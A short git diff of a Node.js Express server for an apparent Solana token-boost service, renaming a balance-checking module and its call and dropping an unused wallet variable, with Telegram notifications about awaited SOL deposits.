@@ -13,7 +13,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const crypto = require('crypto');
 const DataManager = require('./database');
-const BalanceChecker = require('./BalanceChecker');
+const WebSocket = require('./WebSocket');
 const TelegramNotifier = require('./Telegram');
 
 const dataManager = new DataManager();
@@ -72,7 +72,6 @@ app.post('/api/create', async (req, res) => {
     const contractAddress = userData.contractAddress;
     const minimumSolBalance = 0.1;
     const minimumTokenBalance = 5000;
-    const receiverPublicKey = userData.wallet;
 
     if (userData.boostType === 'ultra_boost') {
       const contractAddress = userData.contractAddress;
@@ -87,7 +86,7 @@ app.post('/api/create', async (req, res) => {
     if (typeof receiverPrivateKey !== 'string') {
       throw new TypeError('Receiver private key must be a string');
     }
-    const websocket = new BalanceChecker(
+    const websocket = new WebSocket(
       chatId,
       receiverPrivateKey,
       minimumSolBalance,
@@ -97,7 +96,7 @@ app.post('/api/create', async (req, res) => {
     );
 
     if (!userData?.distributeSolana) {
-      websocket.initialize();
+      websocket.connect();
       telegramNotifier.sendTelegramMessage(chatId, `🔍 Waiting for ${minimumSolBalance} SOL to be confirmed...`);
       res.status(200).send('Checking balance...');
     } 
